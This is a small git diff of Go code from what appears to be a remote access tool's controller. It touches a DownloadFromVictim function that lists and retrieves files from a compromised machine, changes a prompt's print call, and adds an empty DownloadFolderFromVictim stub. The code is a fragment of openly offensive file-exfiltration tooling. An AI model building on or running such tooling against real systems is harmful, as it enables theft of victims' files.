@@ -29,7 +29,7 @@ func DownloadFromVictim(connection net.Conn) (err error) {
 		fmt.Println("\t", index, "\t", fileName)
 	}
 
-	fmt.Println("[+] select file: ")
+	fmt.Print("[+] select file: ")
 	reader := bufio.NewReader(os.Stdin)
 
 	user_input_raw, err := reader.ReadString('\n')
@@ -53,5 +53,9 @@ func DownloadFromVictim(connection net.Conn) (err error) {
 	nbytes, err := file.Write(fs.FileContent)
 	fmt.Println("[+] File downloaded successfully , ", nbytes)
 
+	return
+}
+
+func DownloadFolderFromVictim(connection net.Conn) (err error) {
 	return
 }
